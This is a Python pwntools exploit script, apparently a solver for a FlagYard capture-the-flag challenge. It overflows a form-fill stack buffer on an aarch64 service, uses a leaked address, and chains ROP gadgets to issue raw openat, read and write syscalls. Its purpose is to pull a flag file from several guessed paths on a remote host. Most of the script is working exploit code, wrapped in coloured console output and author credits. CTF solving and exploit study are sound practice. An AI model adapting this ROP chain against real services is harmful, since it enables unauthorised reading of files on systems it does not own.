#!/usr/bin/env python3
"""
mra  -  FlagYard aarch64 pwn exploit (colored edition)
Architecture: aarch64, ROP + raw syscall chain via form-fill stack overflow.
"""
from pwn import *
import os, sys, time

context.arch = 'aarch64'

# ---------------------------------------------------------------------------
# colored output (same design as the NOSJ solver)
# ---------------------------------------------------------------------------
class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"; GRAY = "\033[90m"
    WHITE = "\033[97m"

def enable_vt():
    if os.name == "nt":
        try:
            import ctypes
            k32 = ctypes.windll.kernel32
            mode = ctypes.c_uint()
            h = k32.GetStdHandle(-11)
            k32.GetConsoleMode(h, ctypes.byref(mode))
            k32.SetConsoleMode(h, mode.value | 0x0004)
        except Exception:
            pass
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stdin.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

def bar(frac, width=20):
    filled = int(frac * width)
    return "\u2588" * filled + "\u2591" * (width - filled)

def pct(frac):
    return "[%5.1f%%]" % (frac * 100.0)

def status(frac, msg, icon="\u25b6", color=C.CYAN):
    print("  %s%s %s%s%s %s%s%s" % (C.DIM, pct(frac), C.BOLD + color + icon + " ",
                                    C.RESET, C.DIM, C.BOLD, msg, C.RESET), flush=True)

def ok(frac, msg):
    status(frac, msg, icon="\u2713", color=C.GREEN)

def fail(msg):
    print("  %s\u2717 %s%s%s" % (C.RED, C.BOLD, msg, C.RESET), flush=True)

def banner():
    print(C.MAGENTA + C.BOLD)
    print("  " + "\u2554" + "\u2550" * 58 + "\u2557")
    print("  \u2551          M R A   E X P L O I T            \u2551")
    print("  \u2551   aarch64 ROP syscall chain  |  Pwn        \u2551")
    print("  \u255a" + "\u2550" * 58 + "\u255d")
    print(C.RESET)

# result panel (fixed-width frame) + author credits
W = 58
_TG = "\033[1;38;2;0;136;204m"
_OSC_END = "\x1b]8;;\x1b\\"

def _osc(url, color):
    return "\x1b]8;;%s\x1b\\%s" % (url, color)

def _row(segs):
    out = "  \u2551"
    for t, pre, post in segs:
        if pre:
            out += pre + t + (post or "") + C.RESET
        else:
            out += t
    out += " " * (W - sum(len(t) for t, _, _ in segs)) + "\u2551"
    print(out)

def _credits():
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   made with ", C.GREEN, ""), ("\u2764", "\033[1;31m", ""),
          ("  by  ", C.GREEN, ""), ("Fares Badaj", C.BOLD + C.WHITE, "")])
    _row([("   Red Team Operator | Penetration Tester Specialist", C.DIM + C.CYAN, "")])
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   Telegram  \u203a  ", "", ""),
          ("@ptok3", _osc("https://t.me/ptok3", _TG), _OSC_END),
          ("      t.me/ptok3", C.DIM + C.GRAY, "")])
    _row([("   GitHub    \u203a  ", "", ""),
          ("github.com/FaresBadaj", _osc("https://github.com/FaresBadaj", "\033[1;36m"), _OSC_END)])
    _row([("   LinkedIn  \u203a  ", "", ""),
          ("linkedin.com/in/FaresBadaj", _osc("https://www.linkedin.com/in/FaresBadaj", "\033[1;34m"), _OSC_END)])
    _row([("   Credly    \u203a  ", "", ""),
          ("credly.com/users/faresbadaj", _osc("https://www.credly.com/users/faresbadaj", "\033[1;33m"), _OSC_END)])
    print("  " + "\u255a" + "\u2550" * W + "\u255d")

def big_flag(text, path, chrono):
    line = text.strip().splitlines()[0]
    print()
    head = "\u2605  FLAG CAPTURED  \u2605"
    print("  " + "\u2554" + "\u2550" * W + "\u2557")
    _row([("", "", "")])
    _row([(" " * ((W - len(head)) // 2), "", ""), (head, C.BOLD + C.YELLOW, "")])
    _row([("", "", "")])
    _row([(" " * 6, "", ""), (line, C.BOLD + C.GREEN, "")])
    for s in ("elapsed %.1f s" % chrono,
              "file = %s" % path.rsplit(b"\x00", 1)[0].decode()):
        _row([(" " * 10, "", ""), (s, C.DIM + C.CYAN, "")])
    _row([("", "", "")])
    _credits()
    print()

# ---------------------------------------------------------------------------
# gadgets / constants
# ---------------------------------------------------------------------------
G_X0 = 0x400808   # ldp x0, x3, [sp], #0x10 ; br x3
G_X1 = 0x400810   # ldp x1, x3, [sp], #0x10 ; br x3
G_X2 = 0x400818   # ldp x2, x3, [sp], #0x10 ; br x3
G_X8 = 0x400820   # ldp x8, x3, [sp], #0x10 ; br x3
G_SVC = 0x400828  # svc #0
MENU = 0x400940

X_OPENAT = 56
X_READ = 63
X_WRITE = 64
AT_FDCWD = -100

CANDIDATES = [b'/flag\x00', b'/flag.txt\x00', b'/home/ctf/flag\x00',
              b'/app/flag\x00', b'/chall/flag\x00', b'./flag\x00']


def p64(x):
    return bytes([(x >> s) & 0xff for s in range(0, 64, 8)])


def enter_fill_form(p):
    p.recvuntil(b'Choice: ', timeout=5)
    p.sendline(b'2')
    d = p.recvuntil(b'Enter ur First Name (max 6 chars): ', timeout=5)
    leak = int(d.split(b'hint: ')[1].split(b'\n')[0], 16)
    p.sendline(b'AAAA')
    p.recvuntil(b'Enter ur Last Name (max 6 chars): ', timeout=5)
    return leak


def build_one_syscall(buf, sysno, x0, x1, x2, menu_bridge=True):
    payload = bytearray(0xff)
    payload[0x0c:0x14] = p64(0)          # saved x29
    payload[0x14:0x1c] = p64(G_X0)       # saved x30
    payload[0x1c:0x24] = p64(x0)
    payload[0x24:0x2c] = p64(G_X1)
    payload[0x2c:0x34] = p64(x1)
    payload[0x34:0x3c] = p64(G_X2)
    payload[0x3c:0x44] = p64(x2)
    payload[0x44:0x4c] = p64(G_X8)
    payload[0x4c:0x54] = p64(sysno)
    payload[0x54:0x5c] = p64(G_SVC)
    if menu_bridge:
        payload[0x8c:0x94] = p64(0)
        payload[0x94:0x9c] = p64(G_X1)
        payload[0x9c:0xa4] = p64(0)
        payload[0xa4:0xac] = p64(G_X2)
        payload[0xac:0xb4] = p64(0)
        payload[0xb4:0xbc] = p64(G_X8)
        payload[0xbc:0xc4] = p64(0)
        payload[0xc4:0xcc] = p64(MENU)
    return bytes(payload)


def build_read_write(buf):
    dest = buf + 0x110
    payload = bytearray(0xff)
    payload[0x0c:0x14] = p64(0)
    payload[0x14:0x1c] = p64(G_X0)
    payload[0x1c:0x24] = p64(3)          # fd (assumed /flag -> fd3)
    payload[0x24:0x2c] = p64(G_X1)
    payload[0x2c:0x34] = p64(dest)
    payload[0x34:0x3c] = p64(G_X2)
    payload[0x3c:0x44] = p64(0x100)
    payload[0x44:0x4c] = p64(G_X8)
    payload[0x4c:0x54] = p64(X_READ)
    payload[0x54:0x5c] = p64(G_SVC)
    payload[0x8c:0x94] = p64(1)          # fd stdout
    payload[0x94:0x9c] = p64(G_X1)
    payload[0x9c:0xa4] = p64(dest)
    payload[0xa4:0xac] = p64(G_X2)
    payload[0xac:0xb4] = p64(0x100)
    payload[0xb4:0xbc] = p64(G_X8)
    payload[0xbc:0xc4] = p64(X_WRITE)
    payload[0xc4:0xcc] = p64(G_SVC)
    return bytes(payload)


def try_flag_path(host, port, path):
    p = remote(host, port, timeout=10)
    # Session A: openat(path)
    leakA = enter_fill_form(p)
    bufA = leakA - 6
    path_addr = bufA + 0x5c
    pa = build_one_syscall(bufA, X_OPENAT, AT_FDCWD, path_addr, 0, menu_bridge=True)
    pp = bytearray(pa)
    pp[0x5c:0x5c + len(path)] = path
    p.send(bytes(pp))

    # back at menu
    p.recvuntil(b'Choice: ', timeout=5)
    # Session B: read + write (crash after)
    leakB = enter_fill_form(p)
    bufB = leakB - 6
    pb = build_read_write(bufB)
    p.send(bytes(pb))
    out = p.recvall(timeout=5)
    p.close()
    return out


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------
def main():
    enable_vt()
    banner()
    context.log_level = 'error'

    raw = input("  Target (host:port) > ").strip() or "tcp.flagyard.com:21290"
    raw = raw.replace("tcp://", "").replace("http://", "")
    if ":" in raw:
        host, port_s = raw.rsplit(":", 1)
    else:
        host, port_s = raw, "21290"
    port = int(port_s)
    print("  %s[ target : %s%s:%d%s ]%s\n" % (C.GRAY, C.CYAN, host, port, C.RESET, C.RESET))
    t0 = time.time()

    total = len(CANDIDATES)
    start = 0.10
    for i, path in enumerate(CANDIDATES):
        frac = start + (1.0 - start) * ((i + 1) / total)
        status(frac, "Trying file %s%s%s  (path %d/%d)" %
               (C.YELLOW, path.rsplit(b'\x00', 1)[0].decode(), C.RESET, i + 1, total),
               icon="\u25b6", color=C.CYAN)
        try:
            out = try_flag_path(host, port, path)
        except Exception as e:
            fail("connection/exploit error: %s" % (e,))
            continue

        line = ("  %s  %s%5.1f%%%s %s %s%d bytes%s%s  file=%-18s%s" %
                (bar(frac, 20), C.CYAN, frac * 100.0, C.DIM, C.GRAY, C.GREEN, len(out),
                 C.GRAY, C.DIM, path.rsplit(b'\x00', 1)[0].decode(), C.RESET))
        sys.stdout.write("\r" + line + "   ")
        flags = [l for l in out.splitlines() if b'flag' in l.lower()]
        if flags:
            print()
            ok(min(frac, 0.99), "openat(%s) + read + write: flag leaked!" % path.rsplit(b'\x00', 1)[0].decode())
            big_flag(flags[0].decode(errors="replace"), path, time.time() - t0)
            return
        print()
        ok(frac, "tried %-16s got %d bytes (no flag)" % (path.rsplit(b'\x00', 1)[0].decode(), len(out)))

    fail("no flag in the candidate list \u2014 try other paths or a fresh instance.")


if __name__ == "__main__":
    main()